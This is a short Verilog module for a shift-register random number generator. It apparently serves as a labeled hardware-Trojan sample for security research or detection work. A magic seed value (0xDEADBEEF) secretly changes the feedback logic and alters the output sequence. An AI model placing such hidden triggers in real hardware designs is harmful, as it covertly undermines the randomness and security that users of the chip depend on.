module random_with_trojan (
    
    // Inputs
    input                       i_clk,
    input                       i_reset_n,
    input               [31:0]  i_seed,

    // Outputs
    output              [7:0]  o_data
);

    /******** Reg declarations ********/
    reg [31:0]  r_data;
    wire        w_xnor;

    /******** Trojan trigger condition ********/
    wire        trojan_trigger = (i_seed == 32'hDEADBEEF); // Specific seed value triggers the Trojan

    /******** Conccurrent logic ********/
    assign o_data = r_data[7:0];
    
    // Original logic with potential Trojan modification
    assign w_xnor = trojan_trigger ? 
                    (r_data[31] ^ r_data[29] ^ r_data[25] ^ r_data[24]) : // Trojan changes the operation when triggered
                    (r_data[31] ^ ~r_data[29] ^ ~r_data[25] ^ ~r_data[24]); // Original design

    /******** Process ********/
    always @(posedge i_clk) begin
        if (!i_reset_n) begin
            r_data <= i_seed;
        end else begin
            r_data <= {r_data[30:0], w_xnor};
        end
    end

endmodule
